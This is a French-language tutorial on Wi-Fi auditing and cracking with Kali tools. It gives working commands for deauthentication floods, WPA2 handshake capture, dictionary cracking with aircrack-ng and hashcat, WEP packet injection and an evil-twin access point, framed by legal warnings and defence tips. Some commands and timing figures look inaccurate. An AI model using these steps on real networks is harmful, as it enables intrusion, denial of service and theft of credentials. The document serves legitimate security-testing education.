# Guide Pratique - Analyse Wi-Fi & Crackage

## 🔧 Référence Valeurs Typiques (À adapter selon ton setup)

### Interfaces Réseau Courantes

```bash
# Cartes Wi-Fi typiques Linux:
wlan0          # Interface primaire (la plus courante)
wlan1          # Interface secondaire
wlp2s0         # Interface prédéfinie (Realtek RTL8188)
wlp3s0         # Interface prédéfinie (Atheros AR9271)
wlx00c0cafe1234  # Interface USB externe (format descriptif)

# Cartes spécifiques:
# Realtek RTL8188FU (USB): usb 2-1.1: RTL8188FU Wireless Adapter
# Atheros AR9271 (USB): Ubiquiti Networks Inc. SR71-E
# Intel Killer AX1650: wlp4s0 (laptop intégré)
```

### MACs d'Exemple Réalistes

```bash
# Formats réels observés:

# APs typiques:
# TP-Link:     00:04:ED:xx:xx:xx
# Netgear:     2C:39:95:xx:xx:xx
# Apple:       A8:5E:60:xx:xx:xx
# Cisco:       00:1A:70:xx:xx:xx

# Clients mobiles:
# iPhone:      A8:XX:XX:XX:XX:XX
# Samsung:     F0:8D:FC:XX:XX:XX
# Laptop:      C4:E9:84:XX:XX:XX

# Pour labs: utiliser des plages réservées:
# 00:11:22:33:44:55  (lab AP)
# AA:BB:CC:DD:EE:FF  (lab client)
```

### SSIDs Typiques

```bash
# Réseaux domestiques:
"HOME-WiFi-5G"
"Guest-Network"
"IoT-Devices"

# Réseaux d'entreprise:
"CorporateWiFi"
"CorporateWiFi-Guest"
"SSID_Hidden_Company"

# Publics:
"FreeWiFi_Airport"
"Cafe_Public_WiFi"
"Hotel_Guest"

# Malveillants (simulation pentest):
"FakeWiFi_Clone"
"Evil-Twin-Test"
```

### Chemins Fichiers (Réels Kali)

```bash
# Wordlists:
/usr/share/wordlists/rockyou.txt        # 14 millions mots
/usr/share/wordlists/dirb/common.txt    # Mots courts
/usr/share/wordlists/metasploit/...     # Plusieurs listes

# Captures sauvegardées:
~/capture-01.cap                        # Classique aircrack
~/wifi-scan_2024-05-27.pcap             # Nommage avec date
/tmp/eapol_capture.pcapng               # Fichier temporaire

# Logs & config:
/etc/hostapd/hostapd.conf              # Config AP
/var/log/aircrack-ng/results.txt       # Résultats crackage
~/.local/share/wireshark/                # Prefs Wireshark
```

### Valeurs Réseau Typiques

```bash
# AP réel en labo:
SSID: "TestNetwork-Lab"
BSSID: 00:11:22:33:44:55
Canal: 6 (2.4 GHz) ou 36 (5 GHz)
Puissance: -35 dBm (signal fort en lab)
Clients: 1-3 appareils test

# Client test:
MAC: AA:BB:CC:DD:EE:FF
Signal reçu (RSSI): -40 dBm (bon)
Taux: 130 Mbps (802.11n)
Encryptage: WPA2 ou WPA3

# Données typiques à capture:
Handshake: 4 frames EAPOL
Beacons: 1/sec généralement
Probes: 1-5 par client/minute
Data: Dépend trafic (0-1000 Mbps)
```

---

## Installation Environnement Complet (Kali Linux)

### Option 1 : VirtualBox + Kali Linux

```bash
# Télécharger Kali
wget https://cdimage.kali.org/kali-latest-amd64.iso

# Créer VM (6 GB RAM, 2 CPUs minimum)
# USB passthrough pour carte Wi-Fi physique
```

### Option 2 : Installation native

```bash
# Debian/Ubuntu
sudo apt-get update
sudo apt-get install -y aircrack-ng wireshark tcpdump hashcat

# macOS (Homebrew)
brew install aircrack-ng wireshark hashcat

# Vérifier installation
aircrack-ng --help
wireshark --version
tshark --version
```

---

## Étape 1 : Capture (Voir les données)

### Mode Moniteur - Activation

```bash
# ÉTAPE 1: Lister cartes Wi-Fi (découvrir nom interface)
iwconfig
# Output:
# lo        no wireless extensions.
# eth0      no wireless extensions.
# wlan0     IEEE 802.11  ESSID:"HOME-WiFi"  
#           Mode:Managed  Frequency:2.437 GHz  Access Point: 2C:39:95:12:34:56
# wlp3s0    IEEE 802.11  ESSID:off/any
#           Mode:Managed  Frequency:5.745 GHz  (non associé)

# OU
ip link show
# Output:
# 1: lo: <LOOPBACK,UP,LOWER_UP> ...
# 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
# 3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...

# ÉTAPE 2: Activer mode moniteur

# Méthode 1 : airmon-ng (automatique + sûr)
sudo airmon-ng check kill      # Arrêter services gênants
sudo airmon-ng start wlan0     # Convertir wlan0 → wlan0mon
# Output:
# PHY     Interface       Driver          Chipset
# phy0    wlan0           ath9k           Qualcomm Atheros AR9271

# OU créer interface manuelle sans killer:
# Méthode 2 : iw (plus contrôlé)
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

# ÉTAPE 3: Vérifier mode moniteur ACTIF
iwconfig wlan0
# Doit afficher: Mode:Monitor

# OU
iw dev wlan0 link
# Si "Not connected" → ✓ Moniteur OK
# Si "SSID: ..." → ✗ Toujours en mode géré
```

### Capture Simple (tcpdump)

```bash
# Tout le trafic Wi-Fi sur canal 6
sudo tcpdump -i wlan0mon -c 1000 -w capture.pcap

# Filtre canaux hautes fréquences
sudo tcpdump -i wlan0mon '(wlan[1] & 0x20 == 0x20)' -w wifi.pcap

# Ctrl+C pour arrêter, ou `-c N` pour N paquets
```

### Capture Intelligente (airodump-ng)

```bash
# ÉTAPE 1: Scanner tous APs et clients (reconnaissance)
sudo airodump-ng wlan0mon

# Output exemple réel:
# CH  1 ][ Elapsed: 15 s ][ 2024-05-27 14:32:55 ]
# 
# BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC CIPHER AUTH
# 2C:39:95:12:34:56  -35    245      1203   23   6  130 WPA2 CCMP  PSK    (AP principal)
# 00:11:22:33:44:55  -45     89       234    5  36  270 WPA3 CCMP  PSK    (5 GHz)
# A8:5E:60:78:90:AB  -72     41        12    0  11  54  WEP         (faible signal)
#
# BSSID              STATION            PWR   Rate    Lost    Frames  Notes
# 2C:39:95:12:34:56  F0:8D:FC:AA:BB:CC  -38  130/130   0      845     Client principal
# 2C:39:95:12:34:56  A8:XX:XX:XX:XX:XX  -65   54/130   12     234     Client faible signal
# (not associated)    C4:E9:84:DD:EE:FF  -80    0/0     0       12     Probant (pas connecté)

# ÉTAPE 2: Capturer spécifiquement AP cible + son canal
# Exemple: Capturer "HOME-WiFi" (2C:39:95:12:34:56) sur canal 6
sudo airodump-ng --bssid 2C:39:95:12:34:56 --channel 6 \
                   -w ~/wifi-capture-home wlan0mon

# Si veux aussi capturer clients:
# (fenêtre séparée)
# Sortie fichiers:
# ~/wifi-capture-home-01.cap       ← Données brutes
# ~/wifi-capture-home-01.csv       ← Résumé APs (parsable)
# ~/wifi-capture-home-01.kismet.csv ← Résumé clients (parsable)

# ÉTAPE 3: Forcer nouveau handshake (reconnecter appareil)
# (Fenêtre 3)
sudo aireplay-ng --deauth 5 -a 2C:39:95:12:34:56 wlan0mon
# Attendre 10-20 secondes (client reconnecte)
# Dans airodump: voir nouveau #Data increase

# Stopper capture (Ctrl+C) une fois handshake vu
```

### Capture avec Wireshark GUI

```bash
# Démarrer Wireshark
sudo wireshark

# Interface → wlan0mon
# Démarrer capture (bleu ▶)
# Appliquer filtres Wireshark Display:
#   wlan.fc.type == 0 && wlan.fc.subtype == 8    (Beacons)
#   eapol                                        (WPA Handshake)
#   wlan.fc.type == 2                            (Data frames)

# Sauvegarder → File → Export As... → .pcap
```

---

## Étape 2 : Analyser (Décoder les trames)

### Wireshark - Analyse Graphique

```bash
# Ouvrir capture Wireshark
wireshark ~/wifi-capture-home-01.cap &

# Filtres utiles dans Display Filter bar (top):

# Par SSID/AP/Client:
wlan.ssid == "HOME-WiFi"                     # Tous les frames de ce SSID
wlan.bssid == "2c:39:95:12:34:56"           # Tous les frames de cet AP
wlan.sa == "f0:8d:fc:aa:bb:cc"              # Trame source client

# Par type frame:
wlan.fc.type == 0 && wlan.fc.subtype == 8   # Beacons uniquement
wlan.fc.type == 0 && wlan.fc.subtype == 0   # Association requests
wlan.fc.type == 0 && wlan.fc.subtype == 12  # Deauthentication
wlan.fc.type == 2                           # Data frames

# Sécurité/EAPOL:
eapol && eapol.keydes.type                  # Handshake EAPOL 4-way
eapol.keydes.type == 2 || eapol.keydes.type == 3  # Messages 2 & 3 spécifiquement

# Combiné:
wlan.bssid == "2c:39:95:12:34:56" && eapol  # Handshake de cet AP spécifiquement

# Menu utile: Statistics → Wireless
# Voir: Channels used, Encryption types, APs detected, Clients per AP
# Graphe: RSSI over time, Data rate distribution
```

### tshark - Analysis CLI (Sans GUI)

```bash
# Lister tous les paquets (texte)
tshark -r capture.pcap | head -30

# Compter types frames
tshark -r capture.pcap -Y 'wlan.fc.type == 0' | wc -l  # Management
tshark -r capture.pcap -Y 'wlan.fc.type == 2' | wc -l  # Data
tshark -r capture.pcap -Y 'eapol' | wc -l              # EAPOL

# Extraire détails spécifiques
tshark -r capture.pcap -Y 'wlan.beacon' \
       -T fields -e wlan.bssid -e wlan.ssid | sort | uniq

# Analyser handshake
tshark -r capture.pcap -Y 'eapol.keydes.type' \
       -T fields -e frame.number -e eapol.keydes.type

# Export JSON (utile scripts)
tshark -r capture.pcap -Y 'eapol' -T json > handshake.json
```

### Détection Handshake Valide

```bash
# Critères handshake complet:
# 1. Message 1 (ANonce) : AP → Client
# 2. Message 2 (SNonce + MIC) : Client → AP
# 3. Message 3 (GTK) : AP → Client
# 4. Message 4 (ACK) : Client → AP

# Vérifier avec Wireshark :
# Frame 1: Key Description Type: HMAC-MD5/AES, Key Information Bit 0,1=0
# Frame 2: Key Information Bit 6=1 (MIC present), Bit 0,1=0
# Frame 3: Key Information Bit 13=1 (Install)
# Frame 4: Key Information 0,1,6=0

# Tous 4 présents + dans le bon ordre = ✓ Valid
# Seulement 1-3 = ✗ Incomplete (peut pas cracker)
```

### Décryptage WPA2/WPA3 (Si clé connue)

```bash
# Wireshark GUI:
Edit → Preferences → Protocols → IEEE 802.11
└─ Decryption keys:
   Type: wpa-pwd
   Key: MySSID:MyPassword
   └─ Apply

# Résultat:
# - Voir contenu IP/TCP/HTTP
# - Analyser protocoles applicatifs
# - Identifier anomalies trafic

# tshark CLI:
tshark -r capture.pcap -K wpa-pwd:SSID:password -Y 'ip' | head -20

# Wireshark: Convertir PCAP avec décryption
# File → Export Specified Packets → [export as PCAP]
# → Nouveau fichier .pcap avec données déchiffrées
```

---

## Étape 3 : Cracker (Retrouver PSK)

### Processus Complet (aircrack-ng)

#### 3a. Extraire Handshake

```bash
# Convertir PCAPNG → CAP (airodump-ng lit .cap)
editcap capture.pcapng capture.cap

# Valider handshake présent
aircrack-ng capture.cap --show

# Output:
# Index  BSSID              ESSID         Encryption
# 1      AA:BB:CC:DD:EE:FF  MyNetwork     WPA (1 handshake)
#
# Si "1 handshake" → OK pour crackage
# Si "0 handshake" → ÉCHOUÉ, recapture nécessaire
```

#### 3b. Crackage Simple (CPU)

```bash
# Exemple réel: Cracker "HOME-WiFi" (2C:39:95:12:34:56)
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
            -b 2C:39:95:12:34:56 \
            ~/wifi-capture-home-01.cap

# Sortie exemple:
# [00:12:45] 523451/14344392 keys tested (3.65%)
# [00:45:32] 2345123/14344392 keys tested (16.35%)
# [02:15:18] 5234512/14344392 keys tested (36.50%)
# ...
# [05:23:44] KEY FOUND! [ WiFi2024Home! ]
#
# Master Key          : A1 B2 C3 D4 E5 F6 07 18 29 3A 4B 5C 6D 7E 8F 90
# Transient Key       : 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00
# SSID                : HOME-WiFi
# Encryption          : WPA (PBKDF2, 1 handshake)
# Passphrase (ASCII)  : WiFi2024Home!

# Timing réaliste (CPU):
# - 14M wordlist: 4-6 heures (CPU i7)
# - GPU: 3-5 minutes (RTX 3060)
# - GPU: 1-2 minutes (RTX 4090)

# Si PAS trouvé:
# [04:56:23] 14344391/14344392 keys tested (99.99%)
# KEY NOT FOUND. [ <NEXT_AREA> ]
# → Mot de passe trop complexe / pas dans rockyou
```

#### 3c. Crackage Accéléré (GPU - Plus rapide)

```bash
# Convertir .cap en .hc22000 (hashcat format)
hcxpcapngtool -o hashes.hc22000 capture.pcap

# Crackage GPU (NVIDIA CUDA recommandé)
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt \
        --workload-profile 3 -d 1

# -m 22000 = WPA-PBKDF2-PMKID+EAPOL (le plus rapide)
# -d 1 = GPU 1
# --workload-profile 3 = Max performance

# Vitesse GPU:
# - RTX 3060: ~2.5M tries/sec  → 2.5B wordlist en ~17 min
# - RTX 4090: ~10M tries/sec   → 2.5B wordlist en ~4 min
# - CPU Intel i7: ~10k tries/sec → 2.5B wordlist en ~70 heures ❌
```

### Attaque Forçée (Brute Force Dictionary)

```bash
# Créer custom wordlist
cat > custom_list.txt << EOF
password
password123
password2024
MyNetwork123
TestPassword
EOF

# Crackage
aircrack-ng -w custom_list.txt -b AA:BB:CC:DD:EE:FF capture.cap

# Rechercher patterns:
# - Date (2024, 2023)
# - Années (1990-2024)
# - Numéros (0-999)
# - Common patterns

# Outils wordlist:
crunch 8 12 "abc123!@#" > crunch_list.txt    # Générer tous combos
cat wordlist*.txt | sort -u > merged.txt       # Merger wordlists
```

### Cas Spéciaux

#### WPA3-SAE (Non crackable offline)

```bash
# SAE Dragonfly: Aucune donnée crackable
# PMK pas transmise, pas dans capture
# Status: 🔒 Sûr même mot de passe faible

# Seule approche: Attaque dictionnaire EN DIRECT
# (nécessite target connecté en temps réel)
# Pas couvert ici (demande special)
```

#### WEP (Obsolète - Facile crack)

```bash
# WEP crackable en secondes
aircrack-ng -b AA:BB:CC:DD:EE:FF capture.cap

# Si données insuffisantes:
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
# (Injection de faux packets pour générer IVs)
```

#### EAP-TLS / 802.1X Enterprise

```bash
# Certificats X.509 visibles dans EAPOL
# Peuvent être extraits et analysés:

tshark -r capture.pcap -Y 'eapol' -T fields \
       -e eapol.keydes.type > eapol_frames.txt

# Chercher: TLS Handshake, Certificate, ServerHello
# Si certificat non chaîné correctement:
# → Possible MITM / Evil Twin

# Status: Très difficile cracker (certificats requis)
```

---

## Étape 4 : Exploiter (Déauthentification / Evil Twin)

### Déauthentification (DoS)

```bash
# Déconnecter client spécifique
sudo aireplay-ng --deauth 10 \
                 -a AA:BB:CC:DD:EE:FF \
                 -c 11:22:33:44:55:66 \
                 wlan0mon

# Options:
# --deauth 10 : envoyer 10 frames deauth
# -a BSSID    : AP target
# -c MAC      : client spécifique
# Si pas -c   : déauth TOUS les clients

# Résultat: Client déconnecté, cherche nouvelle AP
# Utilisé pour: force handshake capture

# Légal?  ❌ NON sauf:
#   - Test environnement lab
#   - Authorized pentest
#   - Proprio réseau
```

### Création Rogue AP (Evil Twin)

```bash
# Créer AP virtuel avec hostapd
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=FreeWiFi_Airport
channel=6
hw_mode=g
ieee80211n=1
wmm_enabled=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP TKIP
EOF

# Démarrer AP
sudo hostapd hostapd.conf &

# Clients veront "FreeWiFi_Airport" et peuvent se connecter
# Trafic routés vers attaquant
# Utilisé pour: MITM, credential stealing, malware injection

# Légal? ❌ NON, identique:
#   - Accès réseau non-autorisé
#   - Fraude électronique
```

### Protection Contre Attaques

**Defense (coté utilisateur):**
```
✓ Vérifier BSSID avant connexion (pas ~copie)
✓ Utiliser VPN sur hotspots publics
✓ Désactiver "Auto-connect" réseaux ouverts
✓ Certificats pinning applications
✓ 802.1X + EAP-TLS (si entreprise)
✓ W PA3 SAE (pas crackable)
```

**Defense (coté AP):**
```
✓ PMF (Protected Management Frames) Mandatory
✓ WPA3 SAE uniquement (pas WPA2 compat)
✓ Certificats serveur valides
✓ SSID caché (faible mais aide)
✓ MAC filtering (très faible)
✓ Monitoring continue (IDS)
```

---

## Cas d'Usage Réels

### Scenario 1 : Teste ton propre réseau (Recommandé FIRST!)

```bash
# Objectif: Vérifier robustesse mot de passe TON AP
# Matériel: Kali Linux VM + carte Wi-Fi USB (TP-Link Archer, Netgear, etc)
# Temps: 30 minutes (capture) + 5-10 heures (crack CPU)

# CONTEXTE EXEMPLE:
# AP: "MyHomeWiFi" (BSSID: 2C:39:95:99:88:77)
# Canal: 6 (2.4 GHz)
# PSK actuel: "admin123" (faible - tu vas le cracquer!)
# Client: Laptop avec MAC F0:8D:FC:AA:BB:CC

# ═════════════════════════════════════════════════════════

# STEP 1: Préparer cartes Wi-Fi
airmon-ng check kill      # Arrêter WiFi manager
sudo airmon-ng start wlan0
# Output: [*] Found PHY phy0 (ath9k) with chipset Qualcomm Atheros AR9271 on wlan0
#         [+] Monitor mode enabled on mon0
# ⚠️  Si cela crée mon0 (pas wlan0mon), adapter commandes

# STEP 2: Reconnaissance (Scanner 30 sec)
sudo airodump-ng wlan0mon | head -50
# Voir tes APs, noter BSSID + canal
# Exemple: 2C:39:95:99:88:77  -42  15   MyHomeWiFi  6  WPA2

# STEP 3: Capturer handshake (Fenêtre 1)
sudo airodump-ng --bssid 2C:39:95:99:88:77 \
                   --channel 6 \
                   -w ~/lab-home-capture wlan0mon &
# Voir: "0 stations" initialement

# STEP 4: Forcer reconnexion client (Fenêtre 2)
# Option A: Si client accessible
sudo aireplay-ng --deauth 10 -a 2C:39:95:99:88:77 wlan0mon
# Attendre 15-30 secondes

# Option B: Si besoin client actif
# Sur CLIENT: Déconnecter → Reconnecter Wi-Fi manuellement

# STEP 5: Vérifier capture (dans Fenêtre 1)
# Attendre: "#Data" column dépasse 0
# Si voir: "1 station" avec MAC F0:8D:FC:AA:BB:CC → ✓ Client vu
# Si voir plusieurs #Data → ✓ Handshake en cours

# STEP 6: Arrêter capture (Ctrl+C, 20-30 secondes après deauth)

# STEP 7: Valider handshake
aircrack-ng ~/lab-home-capture-01.cap --show
# Output: 
# Index  BSSID              ESSID           Encryption
# 1      2C:39:95:99:88:77  MyHomeWiFi      WPA (1 handshake)
#
# Si "0 handshake" → Recapture (manqué le timing)
# Si "1 handshake" → ✓ OK passer à étape 8

# STEP 8: Crackage (CPU court-terme)
time aircrack-ng -w /usr/share/wordlists/rockyou.txt \
                 -b 2C:39:95:99:88:77 \
                 ~/lab-home-capture-01.cap

# Temps réaliste: 30 min - 6 heures (selon CPU + dico)
# Sortie:
# KEY FOUND! [ admin123 ]
# real 1m23s  user 3m45s  sys 0m12s

# STEP 9: Résultat & Action

# ✓ SI TROUVÉ (mot de passe faible):
#   DANGER! → Changer le PSK immédiatement!
#   Nouveau: "MyHomeSecure2024#$%"  (16 chars, mélange)
#   
# ✗ SI PAS TROUVÉ (mot de passe fort):
#   BRAVO ✓ PSK robuste
#   Continuer monitoring mises à jour AP

# STEP 10: Nettoyer
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Scenario 2 : Pentest Autorisé (Entreprise)

```bash
# Objectif: Audit sécurité AP entreprise
# Condition: Contrat SIGNED & autorizacao écrite

1. Déploiement diversifié
   sudo airodump-ng wlan0mon
   → Lister tous APs, clients, canaux
   
2. Capture longue durée
   sudo airodump-ng --bssid targets \
                    --channel 6,11,36,40,44 \
                    -w enterprise_scan wlan0mon

3. Analyser handshake qualité
   → Tous 4 messages présents ?
   → Pas de fragmentation ?
   → Timing normal (< 500 ms) ?

4. Tenter crackage (si WPA2-PSK)
   → Avec wordlist entreprise
   → Avec patterns spécifiques
   
5. Tester 802.1X robustesse
   → Certificat valide ?
   → Pas vulnerable PEAP downgrade ?
   → EAP-TLS ou TTLS ?

6. Générer rapport
   ✓ Réseau A: WPA3-SAE, cert valide, RAS
   ✓ Réseau B: WPA2-PSK, mot de passe cracké → RECOMMANDATION: WPA3
   ✗ Réseau Guest: Open network → ajouter OWE

# Legal Disclamer:
# Unauthorized access = Crime (5-20 ans prison)
# Toujours contrat écrit!
```

### Scenario 3 : Forensics Capture

```bash
# Objectif: Analyser incident réseau
# Données: Capture pcap existante

1. Charger fichier Wireshark
   wireshark suspicious_capture.pcapng

2. Analyser timeline
   Statistics → Wireless
   → Quand connexion client ?
   → Quand données exfiltrées ?

3. Identifier patterns
   Beacon timing (AP déconnexions ?)
   Handshake timing (brute-force ?)
   Data volume (anomalies ?)

4. Extraire IOCs (Indicators of Compromise)
   - Client MACs
   - SSID utilisés
   - Canaux
   - Timing patterns

5. Chercher malveillance
   Déauthentification massive (DoS ?)
   Rogue AP probe (attaquant présent ?) tshark -r capture.pcap -Y 'wlan.fc.subtype == 12' | wc -l
   Même client multi-SSID (confused deputy ?)

6. Rapportage
   Timeline
   IOCs compilés
   Recommandations (update firmware, change SSID, etc)
```

---

## Ressources Additionnelles

### Documentation Online
- [Aircrack-ng Wiki](https://www.aircrack-ng.org/doku.php)
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug/)
- [802.11 Standards (IEEE)](https://standards.ieee.org/ieee/802.11/)
- [WPA3 Technical Details](https://www.wi-fi.org/discover-wi-fi/wi-fi-certified-6)

### YouTube Channels
- NetworkChuck (Wi-Fi Security)
- IPPSec (Networking)
- David Bombal (CCNA/Networking)

### Books
- "802.11 Wireless Networks - The Definitive Guide" (O'Reilly)
- "Penetration Testing" (Wundrow)
- "The Hacker Playbook 3" (Kim)

### Training Platforms
- HackTheBox (challenges)
- TryHackMe (guided labs)
- Udemy (practical courses)

---

## Troubleshooting Courant

### Problème: Mode moniteur ne s'active pas

```bash
# Vérifier chipset compatible
lsusb | grep Wireless
lspci | grep Wireless

# Charger drivers si nécessaire
sudo apt install -y linux-headers-$(uname -r) build-essential
sudo apt install -y git
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au && make && sudo make install

# Redémarrer
sudo reboot
```

### Problème: Pas d'handshake capturé

```bash
# Vérifier présence clients
sudo airodump-ng wlan0mon | grep -i "STATION"

# Forcer déconnexion + reconnexion
sudo aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon

# Attendre 10-20 secondes (client reconnecte)

# Sinon: Client en veille → envoyer ping
ping -c 1 192.168.1.CLIENTIP  # Réveille client

# Sinon: AP non vulnérable à déauth
# → Attendre client naturel roaming
```

### Problème: Crack lent

```bash
# Upgrade GPU
# RTX 2080 Ti = ~7M tries/sec
# RTX 4090 = ~10M tries/sec
# Tesla A100 = ~15M tries/sec

# Réduire scope wordlist
grep "^.\{8,12\}$" rockyou.txt > filtered.txt
# (chars 8-12 seulement)

# Utiliser rules hashcat
hashcat ... -r custom.rules
# (permutations intelligentes)
```

### Problème: WPA3 non détecté

```bash
# Vérifier RSNE element en Wireshark
wlan.rsn.version == 1  # Version
wlan.rsn.akms == 0x08  # SAE présent

# Ou tshark
tshark -r capture.pcap -Y 'wlan.rsn' | grep -i "SAE"

# Si absent: AP pas vraiment WPA3
# → Vérifier beacon:
# Settings → IEEE 802.11 Decryption keys → WPA3
```

---

**Guide généré le :** 27 mai 2026  
**Version :** 1.0  
**Avertissement Légal :**
```
Ce guide est à usage ÉDUCATIF et AUTORISÉ UNIQUEMENT.
Utilisation sur réseaux tiers sans permission = Crime.
L'auteur décline toute responsabilité utilisation malveillante.
```
